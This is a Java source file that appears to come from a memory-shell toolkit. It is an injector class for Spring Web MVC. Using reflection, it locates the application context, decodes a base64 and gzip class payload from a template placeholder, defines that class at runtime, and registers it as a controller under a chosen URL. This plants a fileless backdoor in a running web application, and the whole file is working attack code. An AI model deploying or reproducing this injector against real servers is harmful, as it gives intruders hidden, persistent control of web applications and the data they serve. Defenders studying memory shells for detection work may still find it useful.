package com.reajason.javaweb.memshell.injector.springwebmvc;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2024/12/22
 */
public class SpringWebMvcControllerHandlerInjector {

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public SpringWebMvcControllerHandlerInjector() {
        try {
            Object context = getContext();
            Object interceptor = getShell();
            inject(context, interceptor);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Class<?> getServletContextClass(ClassLoader classLoader) throws ClassNotFoundException {
        try {
            return classLoader.loadClass("javax.servlet.ServletContext");
        } catch (Throwable e) {
            return classLoader.loadClass("jakarta.servlet.ServletContext");
        }
    }

    @SuppressWarnings("unchecked")
    public Object getContext() throws ClassNotFoundException, InvocationTargetException, NoSuchMethodException, IllegalAccessException {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Object context = null;
        try {
            Object requestAttributes = invokeMethod(classLoader.loadClass("org.springframework.web.context.request.RequestContextHolder"), "getRequestAttributes");
            Object request = invokeMethod(requestAttributes, "getRequest");
            Object session = invokeMethod(request, "getSession");
            Object servletContext = invokeMethod(session, "getServletContext");
            context = invokeMethod(classLoader.loadClass("org.springframework.web.context.support.WebApplicationContextUtils"), "getWebApplicationContext", new Class[]{getServletContextClass(classLoader)}, new Object[]{servletContext});
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (context == null) {
            try {
                Set<Object> applicationContexts = (Set<Object>) getFieldValue(classLoader.loadClass("org.springframework.context.support.LiveBeansView").newInstance(), "applicationContexts");
                Object applicationContext = applicationContexts.iterator().next();
                if (classLoader.loadClass("org.springframework.web.context.WebApplicationContext").isAssignableFrom(applicationContext.getClass())) {
                    context = applicationContext;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return context;
    }

    private Object getShell() throws Exception {
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Object interceptor = null;
        try {
            interceptor = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
            interceptor = clazz.newInstance();
        }
        return interceptor;
    }

    @SuppressWarnings("unchecked")
    public void inject(Object context, Object controller) throws Exception {
        Class<?> beanNameUrlHandlerMappingClass = null;
        try {
            beanNameUrlHandlerMappingClass = Class.forName("org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping");
        } catch (ClassNotFoundException e) {
            beanNameUrlHandlerMappingClass = Class.forName("org.springframework.web.servlet.handler.SimpleUrlHandlerMapping", false, context.getClass().getClassLoader());
        }
        Object beanNameUrlHandlerMapping = invokeMethod(context, "getBean", new Class[]{Class.class}, new Object[]{beanNameUrlHandlerMappingClass});
        Map<String, Object> handlerMap = (Map<String, Object>) getFieldValue(beanNameUrlHandlerMapping, "handlerMap");
        if (handlerMap.get(getUrlPattern()) != null) {
            System.out.println("controller already injected");
            return;
        }
        handlerMap.put(getUrlPattern(), controller);
        System.out.println("controller injected successfully");
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName) throws
            Exception {
        return invokeMethod(obj, methodName, new Class[0], new Object[0]);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws
            Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;

        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
        } finally {
            if (gzipInputStream != null) {
                try {
                    gzipInputStream.close();
                } catch (IOException ignored) {
                }
            }
            out.close();
        }
        return out.toByteArray();
    }

    @SuppressWarnings("all")
    public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass();
             clazz != Object.class;
             clazz = clazz.getSuperclass()) {
            try {
                return clazz.getDeclaredField(name);
            } catch (NoSuchFieldException ignored) {

            }
        }
        throw new NoSuchFieldException(name);
    }


    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        try {
            Field field = getField(obj, name);
            field.setAccessible(true);
            return field.get(obj);
        } catch (NoSuchFieldException ignored) {
        }
        return null;
    }
}
